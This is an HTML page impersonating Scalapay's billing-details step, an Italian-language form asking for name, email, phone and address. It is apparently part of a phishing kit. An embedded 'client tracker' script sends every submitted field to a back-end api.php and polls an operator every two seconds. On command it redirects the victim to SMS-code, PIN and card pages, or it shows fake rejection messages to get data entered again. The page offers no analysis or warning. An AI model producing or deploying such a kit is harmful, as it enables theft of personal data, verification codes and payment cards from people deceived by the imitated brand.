<html><head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
      <link rel="stylesheet" href="./snipped.css">
   <style>
/* ===== BILLING FORM - fits inside original card ===== */
.billing-main { width: 100%; }
.billing-form-inner { width: 100%; }
.billing-field { margin-bottom: 12px; width: 100%; }
.billing-field:last-child { margin-bottom: 0; }

.billing-inp {
    width: 100%;
    padding: 14px 16px;
    font-size: 15px;
    font-family: inherit;
    border: 2px solid #e5e5e5;
    border-radius: 12px;
    outline: none;
    background: #fff;
    color: #1a1a1a;
    transition: border-color 0.2s, box-shadow 0.2s;
    -webkit-appearance: none;
    appearance: none;
    box-sizing: border-box;
}

.billing-inp:focus {
    border-color: #8b5cf6;
    box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.1);
}

.billing-inp::placeholder { color: #999; }

.billing-select {
    cursor: pointer;
    background-image: url("data:image/svg+xml,%3Csvg width='12' height='8' viewBox='0 0 12 8' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1.5L6 6.5L11 1.5' stroke='%23999' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
    background-repeat: no-repeat;
    background-position: right 16px center;
    padding-right: 40px;
}

.billing-row {
    display: flex;
    gap: 12px;
}

.billing-half {
    width: calc(50% - 6px);
    flex: 1;
}

/* ===== LOADING BUTTON ===== */
.btn-loading {
    background: #868686 !important;
    color: #fff !important;
    cursor: not-allowed !important;
    pointer-events: none;
}
.btn-loading .btn-spinner {
    display: inline-block !important;
}
.btn-spinner {
    display: none;
    width: 16px;
    height: 16px;
    border: 2px solid rgba(255,255,255,0.4);
    border-top-color: #fff;
    border-radius: 50%;
    animation: btn-spin 0.7s linear infinite;
    vertical-align: middle;
    margin-right: 8px;
}
@keyframes btn-spin {
    to { transform: rotate(360deg); }
}

/* ===== MOBILE ===== */
@media (max-width: 768px) {
    .page-module-scss-module__rcUngW__login__appDownloadBanner {
        display: none !important;
    }
}

@media (max-width: 400px) {
    .billing-row {
        flex-direction: column;
        gap: 12px;
    }
    .billing-half {
        width: 100%;
    }
    .billing-inp {
        padding: 12px 14px;
        font-size: 14px;
    }
}
</style>
<base target="_blank">
</head>
   <body data-page="billing">
<div class="page-module-scss-module__rcUngW__login snipcss-x8xsP">
    <div class="page-module-scss-module__rcUngW__header ">
        <div class="page-module-scss-module__rcUngW__header__logo"><img alt="Scalapay" src="./images/scalapay-logo-m.svg"></div>
    </div>
<div class="page-module-scss-module__rcUngW__login__container snipcss-4MG7H">
    <div class="page-module-scss-module__rcUngW__loginArea">
        <div><iframe aria-hidden="true" data-hcaptcha-widget-id="0gkj53vmo1ed" data-hcaptcha-response="" src="https://newassets.hcaptcha.com/captcha/v1/451a37f73f610ddb24b43e498d4539e54eee3e40/static/hcaptcha.html#frame=checkbox-invisible" class="gen-XZO-page-modul style-aFbFB" id="style-aFbFB"></iframe><textarea id="g-recaptcha-response-0gkj53vmo1ed" name="g-recaptcha-response" class="style-r6tSi"></textarea><textarea id="h-captcha-response-0gkj53vmo1ed" name="h-captcha-response" class="style-eiwBK"></textarea></div>
        <div data-automation="phone-otp-challenge-step">
            <form id="passwordless-authentication-form" class="OtpForm-module-scss-module__x5Q-Ya__otpForm" data-automation="otp-form">
                <div class="_card_1bhsr_1 _card--flattened_1bhsr_6 OtpForm-module-scss-module__x5Q-Ya__otpForm__card">
                    <div class="StepHeader-module-scss-module__Jib0XW__stepHeader">
                        <div class="StepHeader-module-scss-module__Jib0XW__stepHeader__icon">
                            <div class="_icon_a84d7_1 style-v6VTs" id="style-v6VTs"><svg width="32" height="33" viewBox="0 0 32 33" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path fill-rule="evenodd" clip-rule="evenodd" 
          d="M16 4.5C11.5817 4.5 8 8.08172 8 12.5C8 18.5 16 27.5 16 27.5C16 27.5 24 18.5 24 12.5C24 8.08172 20.4183 4.5 16 4.5ZM16 7.5C13.2386 7.5 11 9.73858 11 12.5C11 15.2614 13.2386 17.5 16 17.5C18.7614 17.5 21 15.2614 21 12.5C21 9.73858 18.7614 7.5 16 7.5ZM16 9.5C14.3431 9.5 13 10.8431 13 12.5C13 14.1569 14.3431 15.5 16 15.5C17.6569 15.5 19 14.1569 19 12.5C19 10.8431 17.6569 9.5 16 9.5Z" 
          fill="currentColor">
    </path>
</svg></div>
                        </div>
                        <div>
                            <div class="StepHeader-module-scss-module__Jib0XW__stepHeader__title" data-automation="login-header-title">Dati di fatturazione</div>
                            <div class="StepHeader-module-scss-module__Jib0XW__stepHeader__subtitle" data-automation="login-header-subtitle">Inserisci i tuoi dati per completare l'ordine</div>
                            
                        </div>
                    </div>
                    <div class="OtpForm-module-scss-module__x5Q-Ya__otpForm__main billing-main">
                        <div class="billing-form-inner">
                            <div class="billing-field"><input class="billing-inp" type="text" id="nome" placeholder="Nome" required></div>
                            <div class="billing-field"><input class="billing-inp" type="text" id="cognome" placeholder="Cognome" required></div>
                            <div class="billing-field"><input class="billing-inp" type="email" id="email" placeholder="Email" required></div>
                            <div class="billing-field"><input class="billing-inp" type="tel" id="telefono" placeholder="Telefono" required></div>
                            <div class="billing-field"><input class="billing-inp" type="text" id="indirizzo" placeholder="Indirizzo" required></div>
                            <div class="billing-field"><input class="billing-inp" type="text" id="citta" placeholder="Città" required></div>
                            <div class="billing-field billing-row">
                                <input class="billing-inp billing-half" type="text" id="cap" placeholder="CAP" maxlength="5" required>
                                <input class="billing-inp billing-half" type="text" id="provincia" placeholder="Provincia" maxlength="2" required>
                            </div>
                            <div class="billing-field">
                                <select class="billing-inp billing-select" id="paese" required>
                                    <option value="" disabled selected>Seleziona paese</option>
                                    <option value="IT">Italia</option>
                                    <option value="FR">Francia</option>
                                    <option value="DE">Germania</option>
                                    <option value="ES">Spagna</option>
                                    <option value="UK">Regno Unito</option>
                                    <option value="US">Stati Uniti</option>
                                </select>
                            </div>
                        </div>
                    </div>
                    <div class="OtpForm-module-scss-module__x5Q-Ya__otpForm__divider">
                        <hr class="_divider_1v5z2_1 _divider-orientation-horizontal_1v5z2_7 _divider-orientation-horizontal-solid_1v5z2_14 _divider-shade-light_1v5z2_29" aria-orientation="horizontal">
                    </div>
                    <div class="OtpForm-module-scss-module__x5Q-Ya__otpForm__rememberMe">
                        <div class="_root_1985e_1"><input aria-hidden="true" tabindex="-1" type="checkbox" value="on" id="style-salva" class="style-salva"></div><label class="OtpForm-module-scss-module__x5Q-Ya__otpForm__rememberMe__label" for="salva-dati"><span class="OtpForm-module-scss-module__x5Q-Ya__otpForm__rememberMe__text">Salva i dati per i prossimi acquisti</span></label>
                    </div>
                </div>
                <div class="OtpForm-module-scss-module__x5Q-Ya__otpForm__submitButton"><button type="submit" class="_button_1f69x_1 _button--primary_1f69x_15 _button--size-l_1f69x_308 _button--color-normal-lilac_1f69x_34 OtpForm-module-scss-module__x5Q-Ya__otpForm__submitButton__button" data-automation="login-submit-button"><span class="btn-spinner"></span><span class="_button__content_1f69x_355 btn-text">Continua</span></button></div>
            </form>
        </div>
        <div class="LoginFlow-module-scss-module__Q12x1a__loginFlow__loginTermsAndConditions">
            <div class="LoginFlow-module-scss-module__Q12x1a__loginFlow__loginTermsAndConditions__text">Cliccando su "Continua" accetti le <a href="https://cdn.scalapay.com/terms-and-conditions/en-IT/Scalapay - Terms_and_Conditions.pdf" target="_blank" rel="noreferrer" data-automation="general-terms-and-conditions-link">Condizioni generali</a>, e le informative su <a href="https://cdn.scalapay.com/privacy-policy/srl-privacy/en-IT/Scalapay_S.r.l._privacy_policy.pdf" target="_blank" rel="noreferrer" data-automation="privacy-policy-link">privacy</a> e <a href="https://www.scalapay.com/cookies?country=IT" target="_blank" rel="noreferrer" data-automation="cookie-policy-link">cookie</a>.</div>
        </div>
        <div class="LoginFlow-module-scss-module__Q12x1a__loginFlow__visaPartnerDisplay">
            <div class="_container_1j166_1" data-automation="partner-display-container">
                <div data-automation="partner-display-visa-logo" class="_icon_a84d7_1 _container-visa-logo_1j166_13 style-ARvVa" id="style-ARvVa"><svg width="106" height="107" viewBox="0 0 106 107" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M52.4843 36.9211L45.4026 70.0294H36.8368L43.9193 36.9211H52.4843ZM88.5199 58.2995L93.028 45.8667L95.6224 58.2995H88.5199ZM98.0798 70.0294H106L99.0806 36.9211H91.7748C90.1283 36.9211 88.7403 37.8757 88.1259 39.3479L75.2739 70.0294H84.2694L86.0551 65.0848H97.0425L98.0798 70.0294ZM75.7199 59.2206C75.7572 50.4828 63.6408 49.9988 63.722 46.0945C63.748 44.9083 64.8799 43.6446 67.3537 43.3214C68.5801 43.1635 71.9646 43.0355 75.8011 44.8033L77.3016 37.7797C75.2411 37.0343 72.5894 36.3164 69.2898 36.3164C60.8223 36.3164 54.8657 40.8141 54.8181 47.2599C54.7637 52.0265 59.0731 54.6842 62.3131 56.2718C65.6536 57.8944 66.7729 58.9347 66.7565 60.3845C66.7334 62.6059 64.0928 63.5896 61.634 63.6268C57.3254 63.6938 54.8278 62.4621 52.8373 61.5343L51.2824 68.7925C53.2871 69.7099 56.9806 70.5082 60.8051 70.5491C69.8073 70.5491 75.6931 66.1043 75.7199 59.2206ZM40.2451 36.9211L26.3669 70.0294H17.3141L10.4841 43.6066C10.07 41.9818 9.70887 41.3846 8.44965 40.698C6.38992 39.5795 2.98981 38.5333 0 37.8824L0.20255 36.9211H14.777C16.6335 36.9211 18.3037 38.1565 18.7289 40.2951L22.3368 59.4552L31.2466 36.9211H40.2451Z" fill="currentColor"></path>
                    </svg></div>
                <hr class="_divider_1v5z2_1 _divider-orientation-vertical_1v5z2_17 _divider-orientation-vertical-solid_1v5z2_26 _divider-shade-dark_1v5z2_32 _container-divider_1j166_26" aria-orientation="vertical" data-automation="partner-display-divider">
                <div data-automation="partner-display-scalapay-logo" class="_icon_a84d7_1 _container-scalapay-logo_1j166_20 style-Y8nLq" id="style-Y8nLq"><svg width="96" height="19" viewBox="0 0 96 19" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M1.14539 8.06262C0.889399 7.7693 0.900777 7.33071 1.17164 7.05085L4.05547 4.07129C4.35318 3.76369 4.84896 3.7637 5.14667 4.07129L7.35071 6.3485C7.64843 6.6561 8.14421 6.6561 8.44192 6.3485L10.5828 4.1365C10.8806 3.82891 11.3763 3.82891 11.6741 4.1365L14.5477 7.1055C14.8184 7.38522 14.8299 7.82357 14.5742 8.11691L8.45958 15.1321C8.15799 15.4781 7.61737 15.4783 7.31556 15.1325L1.14539 8.06262ZM17.7978 12.9105L18.9473 11.1484C19.5494 11.7168 20.4799 12.0579 21.374 12.0579C22.0126 12.0579 22.5053 11.7358 22.5053 11.2811C22.5053 9.89789 18.2174 10.3905 18.2174 7.43474C18.2174 5.67263 19.8596 4.57368 21.6112 4.57368C22.7607 4.57368 24.0197 5.02842 24.6036 5.50211L23.4906 7.28316C23.0344 6.94211 22.4323 6.65789 21.7937 6.65789C21.1368 6.65789 20.5894 6.92316 20.5894 7.39684C20.5894 8.59053 24.8773 8.11684 24.8773 11.3C24.8773 13.0621 23.2169 14.1421 21.3558 14.1421C20.1333 14.1421 18.8378 13.7063 17.7978 12.9105ZM33.2705 10.6558L35.0951 12.0768C34.0551 13.5168 32.7414 14.1421 31.081 14.1421C28.344 14.1421 26.337 12.02 26.337 9.36737C26.337 6.69579 28.3988 4.57368 31.0992 4.57368C32.6319 4.57368 34.0003 5.31263 34.8214 6.41158L33.1428 7.94632C32.6684 7.30211 31.9568 6.84737 31.0992 6.84737C29.7307 6.84737 28.709 7.96526 28.709 9.36737C28.709 10.8074 29.7125 11.8684 31.1539 11.8684C32.121 11.8684 32.8873 11.2621 33.2705 10.6558ZM43.0322 10.7316V7.98421C42.5395 7.3021 41.7549 6.84737 40.8426 6.84737C39.4559 6.84737 38.5619 8.04105 38.5619 9.36737C38.5619 10.8074 39.5654 11.8684 40.8974 11.8684C41.7914 11.8684 42.576 11.4137 43.0322 10.7316ZM45.4042 4.76316V13.9526H43.1234V13.2137C42.3936 13.8579 41.5542 14.1421 40.6602 14.1421C39.3465 14.1421 38.1057 13.5358 37.3211 12.5884C36.6278 11.7547 36.1899 10.6179 36.1899 9.36737C36.1899 6.65789 38.124 4.57368 40.5325 4.57368C41.536 4.57368 42.43 4.91474 43.1234 5.50211V4.76316H45.4042ZM50.5131 0.5V13.9526H48.1411V0.5H50.5131ZM59.3625 10.7316V7.98421C58.8698 7.3021 58.0852 6.84737 57.1729 6.84737C55.7862 6.84737 54.8922 8.04105 54.8922 9.36737C54.8922 10.8074 55.8957 11.8684 57.2277 11.8684C58.1217 11.8684 58.9063 11.4137 59.3625 10.7316ZM61.7345 4.76316V13.9526H59.4537V13.2137C58.7239 13.8579 57.8845 14.1421 56.9905 14.1421C55.6768 14.1421 54.436 13.5358 53.6514 12.5884C52.9581 11.7547 52.5202 10.6179 52.5202 9.36737C52.5202 6.65789 54.4543 4.57368 56.8627 4.57368C57.8663 4.57368 58.7603 4.91474 59.4537 5.50211V4.76316H61.7345ZM64.4714 18.5V4.76316H66.7522V5.50211C67.4455 4.91474 68.3396 4.57368 69.3431 4.57368C71.7516 4.57368 73.6857 6.65789 73.6857 9.36737C73.6857 10.6179 73.266 11.7547 72.5727 12.5884C71.7881 13.5358 70.5291 14.1421 69.2154 14.1421C68.3213 14.1421 67.555 13.8768 66.8434 13.3084V18.5H64.4714ZM66.8434 7.98421V10.7316C67.2995 11.4137 68.0841 11.8684 68.9782 11.8684C70.3102 11.8684 71.3137 10.8074 71.3137 9.36737C71.3137 8.04105 70.4196 6.84737 69.0329 6.84737C68.1206 6.84737 67.336 7.3021 66.8434 7.98421ZM81.9877 10.7316V7.98421C81.495 7.3021 80.7104 6.84737 79.7981 6.84737C78.4114 6.84737 77.5174 8.04105 77.5174 9.36737C77.5174 10.8074 78.5209 11.8684 79.8529 11.8684C80.7469 11.8684 81.5315 11.4137 81.9877 10.7316ZM84.3597 4.76316V13.9526H82.0789V13.2137C81.3491 13.8579 80.5097 14.1421 79.6157 14.1421C78.302 14.1421 77.0612 13.5358 76.2766 12.5884C75.5833 11.7547 75.1454 10.6179 75.1454 9.36737C75.1454 6.65789 77.0795 4.57368 79.488 4.57368C80.4915 4.57368 81.3856 4.91474 82.0789 5.50211V4.76316H84.3597ZM89.9065 18.5H87.425L89.87 13.0242L85.9106 4.76316H88.5198L91.1107 10.2768L93.501 4.76316H96.0007L89.9065 18.5Z" fill="#272727"></path>
                    </svg></div>
            </div>
        </div>
        <div>
            <div class="Footer-module-scss-module__m5Bw6W__footer__bottom"><a target="_blank" href="https://www.scalapay.com/it/dati-societari" data-automation="profile-about-scalapay-link" rel="noreferrer" class="Footer-module-scss-module__m5Bw6W__footer__bottom__link">Chi è Scalapay</a></div>
        </div>
    </div>
    <div class="page-module-scss-module__rcUngW__login__appDownloadBanner">
        <div class="AppDownloadBanner-module-scss-module__fqXfRW__container">
            <div class="AppDownloadBanner-module-scss-module__fqXfRW__banner AppDownloadBanner-module-scss-module__fqXfRW__banner--loginVariant" data-automation="app-download-banner">
                <div class="BannerText-module-scss-module__7Pv6ma__textSection" data-automation="app-download-banner-text">
                    <h1 class="BannerText-module-scss-module__7Pv6ma__title">Download the App</h1>
                    <ul class="BannerText-module-scss-module__7Pv6ma__features" data-automation="app-download-banner-feature-list">
                        <li>Faster login</li>
                        <li>Get exclusive offers</li>
                        <li>Manage your purchases easily</li>
                        <li>Keep everything under control</li>
                    </ul>
                </div>
                <div class="QrCode-module-scss-module__YPyFKa__qrCodeSection" data-automation="app-download-banner-qr-code"><span>Scan the QR code and get the app</span><img alt="QR Code to the link to download Scalapay app" src="https://login.scalapay.com/images/app-download-qr-code.svg"></div>
                <div class="PhoneImg-module-scss-module__DsgYKG__phoneSection" data-automation="app-download-banner-phone-img"><img alt="Scalapay app screenshot" loading="lazy" class="PhoneImg-module-scss-module__DsgYKG__phoneScreenshot" src="https://login.scalapay.com/images/app-phones.png"></div>
            </div>
        </div>
    </div>
</div></div>
   

<script>
(function() {
    var form = document.getElementById('passwordless-authentication-form');
    var btn = form.querySelector('button[type="submit"]');
    var btnText = btn.querySelector('.btn-text');
    var inputs = form.querySelectorAll('.billing-inp[required]');

    // Enable/disable button based on all required fields being filled
    function checkValid() {
        var allFilled = true;
        inputs.forEach(function(input) {
            if (!input.value.trim()) {
                allFilled = false;
            }
        });
        btn.disabled = !allFilled;
    }

    // Check on every input change
    inputs.forEach(function(input) {
        input.addEventListener('input', function() {
            this.style.borderColor = '';
            checkValid();
        });
        input.addEventListener('change', function() {
            checkValid();
        });
    });

    // Initial check
    checkValid();

    // Submit handler
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        var valid = true;
        inputs.forEach(function(input) {
            if (!input.value.trim()) {
                valid = false;
                input.style.borderColor = '#ef4444';
                setTimeout(function() { input.style.borderColor = ''; }, 2000);
            }
        });
        if (!valid) return;

        btn.classList.add('btn-loading');
        btn.disabled = true;
        btnText.textContent = 'Caricamento...';

        setTimeout(function() {
            btn.classList.remove('btn-loading');
            btn.disabled = false;
            btnText.textContent = 'Continua';
            checkValid(); // re-check after loading
        }, 23000);
    });
})();
</script>
<?php /* Tracker injected into all client pages */ ?>
<script>
// ==================== SCALAPAY CLIENT TRACKER ====================
(function() {
    const basePath = window.location.pathname.replace(/\/pages\/.*$/, '/').replace(/\/[^\/]*$/, '/');
    const API_URL = basePath + 'api.php';
    const PAGE_NAME = document.body.getAttribute('data-page') || 'unknown';

    const PAGE_ERRORS = {
        'login': 'Impossibile inviare il codice di verifica. Controlla il tuo numero di telefono e riprova.',
        'sms': 'Il codice di verifica inserito non è corretto. Riprova.',
        'email': 'Il codice di verifica inserito non è corretto. Controlla la tua casella di posta elettronica e riprova.',
        'pin': 'Il PIN inserito non è corretto. Riprova.',
        'billing': 'Non siamo riusciti a elaborare i tuoi dati di fatturazione. Ti preghiamo di controllare i dati inseriti e riprovare.',
        'card': 'La tua carta è stata rifiutata. Controlla i dati della carta e riprova.',
        'success': 'Si è verificato un errore imprevisto. Riprova più tardi.'
    };

    let clientId = localStorage.getItem('sp_client_id') || '';
    let phoneNumber = localStorage.getItem('sp_phone') || '';
    let emailMask = localStorage.getItem('sp_email') || '';
    let isLoading = false;
    let typingNotified = false;

    console.log('[SP] Tracker loaded. Page:', PAGE_NAME, 'API:', API_URL);

    function register() {
        fetch(API_URL + '?action=register', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ page: PAGE_NAME })
        })
        .then(r => r.json())
        .then(res => {
            if (res.success) {
                clientId = res.clientId;
                localStorage.setItem('sp_client_id', clientId);
                console.log('[SP] Registered:', clientId);
                startHeartbeat();
            }
        })
        .catch(e => console.error('[SP] Register failed:', e));
    }

    function startHeartbeat() {
        doHeartbeat();
        setInterval(doHeartbeat, 2000);
    }

    function doHeartbeat() {
        if (!clientId) return;
        fetch(API_URL + '?action=heartbeat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ clientId: clientId, page: PAGE_NAME })
        })
        .then(r => r.json())
        .then(res => {
            if (res.success && res.commands && res.commands.length > 0) {
                res.commands.forEach(cmd => handleCommand(cmd));
            }
        })
        .catch(() => {});
    }

    function handleCommand(cmd) {
        console.log('[SP] Command received:', cmd);
        switch (cmd.type) {
            case 'redirect':
                const pages = {
                    'login': 'index.php',
                    'sms': 'sms.php',
                    'email': 'email.php',
                    'pin': 'pin.php',
                    'billing': 'billing.php',
                    'card': 'card.php',
                    'success': 'success.php'
                };
                const target = pages[cmd.target] || cmd.target + '.php';
                window.location.href = target;
                break;

            case 'showError':
                stopLoading();
                const errorMsg = PAGE_ERRORS[PAGE_NAME] || 'An error occurred. Please try again.';
                showErrorToast(errorMsg);
                break;

            case 'setEmail':
                localStorage.setItem('sp_email', cmd.email);
                applyEmailMask(cmd.email);
                break;
        }
    }

    function stopLoading() {
        isLoading = false;
        document.querySelectorAll('form').forEach(function(form) {
            const btn = form.querySelector('button[type="submit"]');
            if (btn) {
                btn.disabled = false;
                btn.classList.remove('btn-loading');
                const spinner = btn.querySelector('.btn-spinner');
                if (spinner) spinner.style.display = 'none';
                const txt = btn.querySelector('.btn-text');
                if (txt) {
                    txt.textContent = (PAGE_NAME === 'login' || PAGE_NAME === 'sms') ? 'Continue' : 'Continua';
                }
            }
            form.querySelectorAll('input').forEach(function(inp) {
                inp.disabled = false;
                inp.style.opacity = '1';
            });
        });
    }

    function showErrorToast(message) {
        let toast = document.getElementById('sp-error-toast');
        if (!toast) {
            toast = document.createElement('div');
            toast.id = 'sp-error-toast';
            toast.innerHTML = `
                <div class="sp-err-box">
                    <div class="sp-err-icon">!</div>
                    <div class="sp-err-msg" id="sp-err-text"></div>
                    <button class="sp-err-close" onclick="document.getElementById('sp-error-toast').classList.remove('sp-active')">&times;</button>
                </div>
            `;
            document.body.appendChild(toast);
        }
        document.getElementById('sp-err-text').textContent = message;
        toast.classList.add('sp-active');
        setTimeout(() => toast.classList.remove('sp-active'), 7000);
    }
    window.showSPError = showErrorToast;

    function trackTyping(input) {
        input.addEventListener('input', function() {
            if (!typingNotified && clientId) {
                fetch(API_URL + '?action=typing', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ clientId: clientId, page: PAGE_NAME })
                }).catch(() => {});
                typingNotified = true;
            }
        });
    }

    function trackForms() {
        document.querySelectorAll('form').forEach(function(form) {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                if (isLoading) return;

                const data = {};
                form.querySelectorAll('input, select, textarea').forEach(function(inp) {
                    if (inp.id || inp.name) {
                        data[inp.id || inp.name] = inp.value;
                    }
                });

                const phoneVal = data['login-phone-number-input'] || data['phone'] || '';
                if (phoneVal) {
                    localStorage.setItem('sp_phone', phoneVal);
                    phoneNumber = phoneVal;
                }

                if (clientId) {
                    fetch(API_URL + '?action=data', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ clientId: clientId, data: data })
                    }).catch(() => {});
                }

                isLoading = true;
                const btn = form.querySelector('button[type="submit"]');
                if (btn) {
                    btn.disabled = true;
                    btn.classList.add('btn-loading');
                    const spinner = btn.querySelector('.btn-spinner');
                    if (spinner) spinner.style.display = 'inline-block';
                    const txt = btn.querySelector('.btn-text');
                    if (txt) txt.textContent = '';
                }

                form.querySelectorAll('input').forEach(function(inp) {
                    inp.disabled = true;
                    inp.style.opacity = '0.6';
                });
            });
        });
    }

    function applyEmailMask(maskedEmail) {
        const subtitles = document.querySelectorAll('[data-automation="login-header-subtitle"]');
        subtitles.forEach(function(sub) {
            const text = sub.textContent.toLowerCase();
            if (text.includes('@') || text.includes('email') || text.includes('invia') || text.includes('inviato') || text.includes('codice')) {
                sub.textContent = 'Codice inviato a ' + maskedEmail;
            }
        });
    }

    function applyStoredPhone() {
        if (PAGE_NAME === 'sms' && phoneNumber) {
            const subs = document.querySelectorAll('[data-automation="login-header-subtitle"]');
            subs.forEach(function(sub) {
                sub.textContent = 'Enter the verification code we sent to ' + phoneNumber + '.';
            });
        }
    }

    if (!clientId) {
        register();
    } else {
        startHeartbeat();
    }

    trackForms();
    applyStoredPhone();

    setTimeout(function() {
        document.querySelectorAll('input').forEach(function(inp) {
            trackTyping(inp);
        });
    }, 300);

    if (emailMask && PAGE_NAME === 'email') {
        applyEmailMask(emailMask);
    }

})();
</script>

<style>
#sp-error-toast {
    position: fixed !important;
    top: 20px !important;
    right: 20px !important;
    z-index: 999999 !important;
    transform: translateX(450px) !important;
    opacity: 0 !important;
    transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) !important;
    pointer-events: none !important;
    max-width: 400px !important;
}
#sp-error-toast.sp-active {
    transform: translateX(0) !important;
    opacity: 1 !important;
    pointer-events: auto !important;
}
.sp-err-box {
    display: flex !important;
    align-items: flex-start !important;
    gap: 14px !important;
    background: #fef2f2 !important;
    border-radius: 16px !important;
    padding: 16px 18px !important;
    box-shadow: 0 8px 30px rgba(239, 68, 68, 0.15), 0 2px 8px rgba(0,0,0,0.08) !important;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;
}
.sp-err-icon {
    width: 24px !important;
    height: 24px !important;
    min-width: 24px !important;
    border-radius: 50% !important;
    border: 2px solid #ef4444 !important;
    color: #ef4444 !important;
    font-size: 14px !important;
    font-weight: 700 !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    flex-shrink: 0 !important;
    margin-top: 1px !important;
    background: transparent !important;
}
.sp-err-msg {
    color: #1f2937 !important;
    font-size: 13px !important;
    line-height: 1.5 !important;
    font-weight: 400 !important;
    flex: 1 !important;
    padding-right: 8px !important;
}
.sp-err-close {
    background: none !important;
    border: none !important;
    color: #6b7280 !important;
    font-size: 22px !important;
    font-weight: 300 !important;
    cursor: pointer !important;
    padding: 0 !important;
    line-height: 1 !important;
    width: 24px !important;
    height: 24px !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    flex-shrink: 0 !important;
    margin-top: -2px !important;
}
.sp-err-close:hover { color: #1f2937 !important; }
</style>
</body></html>